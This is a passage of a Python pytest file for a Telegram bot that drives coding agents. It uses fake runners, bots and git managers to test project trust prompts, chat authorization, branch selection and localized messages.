from __future__ import annotations

import asyncio
import html
import logging
import sqlite3
import shlex
import sys
import threading
from pathlib import Path
from types import SimpleNamespace

import pytest
from coding_agent_telegram.agent_runner import AgentProgressInfo, AgentRunResult, AgentStallInfo
from coding_agent_telegram.command_router import CommandRouter, RouterDeps
from coding_agent_telegram.config import AppConfig
from coding_agent_telegram.session_store import SessionStore
from coding_agent_telegram.speech_to_text import SpeechToTextError
from telegram.error import BadRequest


class DummyRunner:
    def __init__(self):
        self.create_calls = []
        self.resume_calls = []

    def create_session(
        self,
        provider,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.create_calls.append(
            {
                "provider": provider,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
                "on_progress": on_progress,
            }
        )
        return AgentRunResult(
            session_id="sess_abc123",
            success=True,
            assistant_text="",
            error_message=None,
            raw_events=[],
        )

    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
                "on_progress": on_progress,
            }
        )
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="",
            error_message=None,
            raw_events=[],
        )


class CompactingRunner(DummyRunner):
    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
                "on_progress": on_progress,
            }
        )
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="Current goal: finish compact flow.\nFiles changed: README.md\nNext step: continue safely.",
            error_message=None,
            raw_events=[],
        )

    def create_session(
        self,
        provider,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.create_calls.append(
            {
                "provider": provider,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
                "on_progress": on_progress,
            }
        )
        return AgentRunResult(
            session_id="sess_compacted",
            success=True,
            assistant_text="Handoff loaded.",
            error_message=None,
            raw_events=[],
        )


class MarkdownRunner(DummyRunner):
    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
            }
        )
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="See [agent_runner.py](/tmp/agent_runner.py) and `config.py`.",
            error_message=None,
            raw_events=[],
        )


class CommandBlockRunner(DummyRunner):
    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
            }
        )
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="Run this command:\n```bash\ngit commit -m \"test\"\n```",
            error_message=None,
            raw_events=[],
        )


class SessionIdRotatingRunner(DummyRunner):
    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
            }
        )
        return AgentRunResult(
            session_id="sess_rotated",
            success=True,
            assistant_text="rotated",
            error_message=None,
            raw_events=[],
        )


class ResumeReplacementRunner(DummyRunner):
    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
            }
        )
        return AgentRunResult(
            session_id=None,
            success=False,
            assistant_text="",
            error_message="Failed to resume session.",
            raw_events=[],
        )


class LongEscapedMarkdownRunner(DummyRunner):
    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
            }
        )
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="\n".join(["<tag> & value" for _ in range(40)]),
            error_message=None,
            raw_events=[],
        )


class FakeBot:
    def __init__(self):
        self.messages = []
        self.sent_messages = []
        self.actions = []
        self.deleted_messages = []
        self.send_count = 0
        self.edit_count = 0

    async def send_message(self, chat_id, text, parse_mode=None, reply_markup=None, reply_to_message_id=None):
        self.send_count += 1
        self.sent_messages.append(
            {
                "chat_id": chat_id,
                "text": text,
                "parse_mode": parse_mode,
                "reply_markup": reply_markup,
                "reply_to_message_id": reply_to_message_id,
            }
        )
        self.messages.append((chat_id, text, parse_mode, reply_markup))
        return SimpleNamespace(message_id=len(self.messages))

    async def edit_message_text(self, chat_id, message_id, text, parse_mode=None, reply_markup=None):
        self.edit_count += 1
        self.messages.append((chat_id, text, parse_mode, reply_markup))

    async def delete_message(self, chat_id, message_id):
        self.deleted_messages.append((chat_id, message_id))

    async def send_chat_action(self, chat_id, action):
        self.actions.append((chat_id, action))


class SlowProgressBot(FakeBot):
    async def send_message(self, chat_id, text, parse_mode=None, reply_markup=None, reply_to_message_id=None):
        if "Live agent output" in text:
            await asyncio.sleep(0.2)
        return await super().send_message(
            chat_id,
            text,
            parse_mode=parse_mode,
            reply_markup=reply_markup,
            reply_to_message_id=reply_to_message_id,
        )


class EditFailingProgressBot(FakeBot):
    async def edit_message_text(self, chat_id, message_id, text, parse_mode=None, reply_markup=None):
        raise BadRequest("message can't be edited")


class FakeGitManager:
    def __init__(
        self,
        *,
        is_git_repo=False,
        current_branch=None,
        default_branch=None,
        local_branches=None,
        prepare_result=None,
        prepare_from_source_result=None,
        checkout_result=None,
        git_command_results=None,
        push_result=None,
    ):
        self._is_git_repo = is_git_repo
        self._current_branch = current_branch
        self._default_branch = default_branch
        self._local_branches = local_branches or []
        self.prepare_result = prepare_result
        self.prepare_from_source_result = prepare_from_source_result
        self.checkout_result = checkout_result
        self.git_command_results = list(git_command_results or [])
        self.push_result = push_result
        self.refresh_result = None
        self.git_commands = []
        self.safe_git_commands = []
        self.push_calls = []
        self.prepare_from_source_calls = []

    def is_git_repo(self, project_path):
        return self._is_git_repo

    def current_branch(self, project_path):
        return self._current_branch

    def default_branch(self, project_path):
        return self._default_branch

    def list_local_branches(self, project_path):
        return self._local_branches

    def local_branch_exists(self, project_path, branch_name):
        return branch_name in self._local_branches

    def remote_branch_exists(self, project_path, branch_name):
        return branch_name in self._local_branches or branch_name == self._default_branch

    def refresh_current_branch(self, project_path):
        return self.refresh_result

    def prepare_branch(self, project_path, *, origin_branch, new_branch):
        return self.prepare_result

    def prepare_branch_from_source(self, project_path, *, source_kind, source_branch, new_branch):
        self.prepare_from_source_calls.append((project_path, source_kind, source_branch, new_branch))
        if self.prepare_from_source_result is not None and getattr(self.prepare_from_source_result, "current_branch", None):
            self._current_branch = self.prepare_from_source_result.current_branch
        return self.prepare_from_source_result

    def checkout_branch(self, project_path, branch_name):
        if self.checkout_result is not None and getattr(self.checkout_result, "success", False):
            self._current_branch = getattr(self.checkout_result, "current_branch", branch_name)
        return self.checkout_result

    def run_git_command(self, project_path, args):
        self.git_commands.append((project_path, args))
        if self.git_command_results:
            return self.git_command_results.pop(0)
        return SimpleNamespace(success=True, message=f"git {' '.join(args)} completed.")

    def run_safe_commit_command(self, project_path, args):
        self.safe_git_commands.append((project_path, args))
        if self.git_command_results:
            return self.git_command_results.pop(0)
        return SimpleNamespace(success=True, message=f"git {' '.join(args)} completed.")

    def push_branch(self, project_path, branch_name):
        self.push_calls.append((project_path, branch_name))
        if self.push_result is not None:
            return self.push_result
        return SimpleNamespace(success=True, message=f"Pushed branch '{branch_name}' to origin.", current_branch=branch_name)


class FakeTelegramFile:
    def __init__(self, content: bytes, file_path: str):
        self._content = content
        self.file_path = file_path

    async def download_as_bytearray(self):
        return bytearray(self._content)


class FakeVoiceMessage:
    def __init__(
        self,
        telegram_file: FakeTelegramFile,
        *,
        file_unique_id: str = "voice.ogg",
        file_size=None,
        file_name: str | None = None,
    ):
        self.telegram_file = telegram_file
        self.file_unique_id = file_unique_id
        self.file_size = file_size if file_size is not None else len(getattr(telegram_file, "_content", b""))
        self.file_name = file_name

    async def get_file(self):
        return self.telegram_file


class FakePhotoSize:
    def __init__(self, telegram_file: FakeTelegramFile, *, file_size=None):
        self.telegram_file = telegram_file
        self.file_size = file_size if file_size is not None else len(getattr(telegram_file, "_content", b""))

    async def get_file(self):
        return self.telegram_file


def make_update(chat_id=123, chat_type="private", text="hello", message_id=1):
    return SimpleNamespace(
        effective_chat=SimpleNamespace(id=chat_id, type=chat_type),
        message=SimpleNamespace(text=text, photo=None, caption=None, message_id=message_id),
    )


def make_config(tmp_path: Path, *, locale: str = "en") -> AppConfig:
    return AppConfig(
        workspace_root=tmp_path,
        state_file=tmp_path / "state.json",
        state_backup_file=tmp_path / "state.json.bak",
        log_level="INFO",
        log_dir=tmp_path / "logs",
        telegram_bot_tokens=("x",),
        allowed_chat_ids={123},
        codex_bin=sys.executable,
        copilot_bin=sys.executable,
        codex_model="",
        copilot_model="",
        copilot_autopilot=True,
        copilot_no_ask_user=True,
        copilot_allow_all=True,
        copilot_allow_all_tools=False,
        copilot_allow_tools=(),
        copilot_deny_tools=(),
        copilot_available_tools=(),
        codex_approval_policy="never",
        codex_sandbox_mode="workspace-write",
        codex_skip_git_repo_check=False,
        enable_commit_command=False,
        snapshot_text_file_max_bytes=200000,
        max_telegram_message_length=3000,
        enable_sensitive_diff_filter=True,
        enable_secret_scrub_filter=True,
        enable_openai_whisper_speech_to_text=False,
        openai_whisper_model="base",
        openai_whisper_timeout_seconds=120,
        default_agent_provider="codex",
        agent_hard_timeout_seconds=0,
        app_internal_root=tmp_path / ".coding-agent-telegram",
        locale=locale,
    )


def seed_codex_native_session(
    home: Path,
    *,
    session_id: str,
    cwd: Path,
    title: str,
    branch: str,
    created_at: int,
    updated_at: int,
) -> None:
    codex_dir = home / ".codex"
    codex_dir.mkdir(parents=True, exist_ok=True)
    db_path = codex_dir / "state_5.sqlite"
    conn = sqlite3.connect(db_path)
    try:
        conn.execute(
            """
            CREATE TABLE threads (
                id TEXT PRIMARY KEY,
                cwd TEXT NOT NULL,
                title TEXT NOT NULL,
                first_user_message TEXT NOT NULL,
                git_branch TEXT,
                created_at INTEGER NOT NULL,
                updated_at INTEGER NOT NULL,
                archived INTEGER NOT NULL DEFAULT 0
            )
            """
        )
        conn.execute(
            """
            INSERT INTO threads (id, cwd, title, first_user_message, git_branch, created_at, updated_at, archived)
            VALUES (?, ?, ?, ?, ?, ?, ?, 0)
            """,
            (session_id, str(cwd), title, title, branch, created_at, updated_at),
        )
        conn.commit()
    finally:
        conn.close()


def seed_copilot_native_session(
    store_root: Path,
    *,
    session_id: str,
    branch: str,
    created_at: str,
    updated_at: str,
    summary: str = "",
    with_events: bool = True,
    cwd: Path | None = None,
) -> None:
    session_dir = store_root / ".copilot" / "session-state" / session_id
    session_dir.mkdir(parents=True, exist_ok=True)
    session_cwd = cwd or store_root
    lines = [
        f"id: {session_id}",
        f"cwd: {session_cwd}",
        f"git_root: {session_cwd}",
        f"branch: {branch}",
        f"created_at: {created_at}",
        f"updated_at: {updated_at}",
    ]
    if summary:
        lines.append(f"summary: {summary}")
    else:
        lines.append("summary_count: 0")
    (session_dir / "workspace.yaml").write_text("\n".join(lines) + "\n", encoding="utf-8")
    if with_events:
        (session_dir / "events.jsonl").write_text("", encoding="utf-8")


def test_project_command_rejects_path(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend/api"], bot=bot)

    asyncio.run(router.handle_project(update, context))
    assert "Invalid project folder" in bot.messages[-1][1]


def test_unauthorized_chat_is_ignored_silently(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(chat_id=999)
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert bot.messages == []


def test_group_chat_is_ignored_silently(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(chat_type="group")
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert bot.messages == []


def test_project_command_creates_missing_folder(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert (tmp_path / "backend").is_dir()
    assert store.get_chat_state("bot-a", 123)["current_project_folder"] == "backend"
    assert store.is_project_trusted("backend") is True
    assert "Project: <code>backend</code>" in bot.messages[0][1]


def test_project_command_warns_when_existing_project_is_untrusted(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert bot.messages[-1][1] == "Do you trust this project?\nProject: <code>backend</code>"
    assert bot.messages[-1][3] is not None
    buttons = bot.messages[-1][3].inline_keyboard[0]
    assert buttons[0].text == "Yes"
    assert buttons[1].text == "No"
    assert buttons[0].api_kwargs == {"style": "primary"}
    assert buttons[1].api_kwargs == {"style": "danger"}
    assert store.is_project_trusted("backend") is False


def test_project_command_reports_current_branch_for_git_repo(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    message = bot.messages[0][1]
    assert "Project changed to: backend" in message
    assert "Branch selection is required" in message
    assert "Current branch in repo: main" in message
    assert "Select a branch with:" in message
    assert "current_branch" not in store.get_chat_state("bot-a", 123)


def test_project_command_is_localized_in_zh_tw(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path, locale="zh-TW")
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    message = bot.messages[0][1]
    assert "已切換專案至：backend" in message
    assert "必須先選擇 branch" in message
    assert "儲存庫目前 branch：main" in message
    assert "請用以下指令選擇 branch：" in message


def test_project_command_warns_when_active_session_belongs_to_another_project(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_1", "old-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["frontend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    message = bot.messages[0][1]
    assert "Active Session Mismatch" in message
    assert "Session project: <code>backend</code>" in message
    assert "Start a new session with <code>/new</code>" in message


def test_trust_project_callback_marks_project_trusted(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    answers = []
    edited = []
    query = SimpleNamespace(
        data="trustproject:yes:backend",
        answer=lambda: answers.append("answered"),
        edit_message_text=lambda text: edited.append(text),
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="trustproject:yes:backend",
            answer=(lambda: None),
            edit_message_text=(lambda text: None),
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        answers.append("answered")

    async def fake_edit(text):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_trust_project_callback(update, context))

    assert store.is_project_trusted("backend") is True
    assert edited[-1] == "Project trusted: backend"


def test_unauthorized_trust_project_callback_is_answered_without_side_effects(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    answers = []
    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=999, type="private"),
        callback_query=SimpleNamespace(
            data="trustproject:yes:backend",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        answers.append("answered")

    async def fake_edit(text):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_trust_project_callback(update, context))

    assert answers == ["answered"]
    assert edited == []
    assert bot.messages == []
    assert store.is_project_trusted("backend") is False


def test_branch_command_requires_project_first(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert "No project selected." in bot.messages[-1][1]


def test_branch_command_lists_branches_when_project_is_set(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="feature-1",
        default_branch="main",
        local_branches=["main", "feature-1", "feature-2"],
    )
    router.git.refresh_result = SimpleNamespace(
        success=True,
        message="Updated branch 'feature-1' from origin.",
        current_branch="feature-1",
        default_branch="main",
        warnings=(),
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    message = bot.messages[-1][1]
    assert "Project: backend" in message
    assert "Current branch in repo: feature-1" in message
    assert "Default branch: main" in message
    assert "* feature-1 (current branch in repo)" in message
    assert "- main (default)" in message
    assert "Select a branch with:" in message


def test_branch_command_lists_branches_even_when_refresh_warns(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="feature-deleted-remote",
        default_branch="main",
        local_branches=["main", "feature-deleted-remote"],
    )
    router.git.refresh_result = SimpleNamespace(
        success=True,
        message="Updated branch 'feature-deleted-remote' from origin.",
        current_branch="feature-deleted-remote",
        default_branch="main",
        warnings=("git pull failed for branch: feature-deleted-remote",),
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    message = bot.messages[-1][1]
    assert "Refresh warnings:" in message
    assert "git pull failed for branch: feature-deleted-remote" in message
    assert "* feature-deleted-remote (current branch in repo)" in message
    assert "- main (default)" in message


def test_branch_command_uses_default_branch_when_origin_not_provided(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        default_branch="main",
        local_branches=["main"],
        prepare_from_source_result=SimpleNamespace(
            success=True,
            message="Created branch 'feature-1' from origin/main.",
            current_branch="feature-1",
            default_branch="main",
        ),
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["feature-1"], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert "Creating a new branch from the following branch source: feature-1" in bot.messages[-1][1]
    assert "Choose the branch source:" in bot.messages[-1][1]
    assert "Branch target: feature-1" in bot.messages[-1][1]
    reply_markup = bot.messages[-1][3]
    assert reply_markup is not None

    token = router._register_branch_source_token("origin", "main", "feature-1")
    query = SimpleNamespace(
        data=f"branchsource:{token}",
        answer=None,
        edit_message_text=None,
    )
    callback_update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
    )
    edited = []

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_source_callback(callback_update, context))

    assert "Created branch" in edited[-1][0]
    assert "feature-1" in edited[-1][0]
    assert "Current branch: feature-1" in edited[-1][0]
    assert store.get_chat_state("bot-a", 123)["current_branch"] == "feature-1"


def test_branch_command_is_localized_in_zh_tw(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path, locale="zh-TW")
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        default_branch="main",
        local_branches=["main"],
        prepare_from_source_result=SimpleNamespace(
            success=True,
            message="Created branch 'feature-1' from origin/main.",
            current_branch="feature-1",
            default_branch="main",
        ),
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["feature-1"], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    message = bot.messages[-1][1]
    assert "要建立新 branch feature-1" in message
    assert "請選擇 branch 來源：" in message
    assert "目標 branch：feature-1" in message

    token = router._register_branch_source_token("origin", "main", "feature-1")
    query = SimpleNamespace(
        data=f"branchsource:{token}",
        answer=None,
        edit_message_text=None,
    )
    callback_update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
    )
    edited = []

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_source_callback(callback_update, context))

    assert "目前 branch：feature-1" in edited[-1][0]


def test_branch_command_for_new_branch_offers_current_and_default_sources(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="feature-enhancements",
        default_branch="main",
        local_branches=["main", "feature-enhancements"],
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["new-feature"], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    message = bot.messages[-1][1]
    assert "Creating a new branch from the following branch source: new-feature" in message
    assert "Current branch in repo: feature-enhancements" in message
    assert "Default branch: main" in message
    reply_markup = bot.messages[-1][3]
    assert reply_markup is not None
    labels = [button.text for row in reply_markup.inline_keyboard for button in row]
    assert labels == [
        "local/feature-enhancements",
        "origin/feature-enhancements",
        "local/main",
        "origin/main",
    ]


def test_branch_command_switches_to_existing_branch(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.create_session("bot-a", 123, "sess_branch", "branch-session", "backend", "codex", branch_name="feature-1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        local_branches=["main", "feature-1"],
        prepare_from_source_result=SimpleNamespace(
            success=True,
            message="Switched to existing local branch 'main'.",
            current_branch="main",
            default_branch="main",
        ),
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["main"], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert "Switching branch to main requires choosing a source first." in bot.messages[-1][1]
    assert "Choose the branch source:" in bot.messages[-1][1]
    token = router._register_branch_source_token("local", "main", "main")
    query = SimpleNamespace(
        data=f"branchsource:{token}",
        answer=None,
        edit_message_text=None,
    )
    callback_update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
    )
    edited = []

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit
    asyncio.run(router.handle_branch_source_callback(callback_update, context))

    assert "Switched to existing local branch" in edited[-1][0]
    assert "Current branch: main" in edited[-1][0]
    state = store.get_chat_state("bot-a", 123)
    assert state["current_branch"] == "main"
    assert state["sessions"]["sess_branch"]["branch_name"] == "main"


class StallingRunner(DummyRunner):
    def create_session(
        self,
        provider,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        if on_stall is not None:
            on_stall(
                AgentStallInfo(
                    command=("codex", "exec"),
                    elapsed_seconds=18.0,
                    idle_seconds=18.0,
                    seen_output=False,
                    last_stderr="",
                )
            )
        return super().create_session(
            provider,
            project_path,
            user_message,
            skip_git_repo_check=skip_git_repo_check,
            image_paths=image_paths,
            on_stall=on_stall,
            on_progress=on_progress,
        )

    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        if on_stall is not None:
            on_stall(
                AgentStallInfo(
                    command=("codex", "exec", "resume"),
                    elapsed_seconds=18.0,
                    idle_seconds=18.0,
                    seen_output=False,
                    last_stderr="",
                )
            )
        return super().resume_session(
            provider,
            session_id,
            project_path,
            user_message,
            skip_git_repo_check=skip_git_repo_check,
            image_paths=image_paths,
            on_stall=on_stall,
            on_progress=on_progress,
        )


class ProgressRunner(DummyRunner):
    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        if on_progress is not None:
            on_progress(
                AgentProgressInfo(
                    command=("codex", "exec", "resume"),
                    elapsed_seconds=5.0,
                    text="Indexing files...",
                    source="stdout",
                )
            )
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="done",
            error_message=None,
            raw_events=[],
        )


class RapidProgressRunner(DummyRunner):
    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
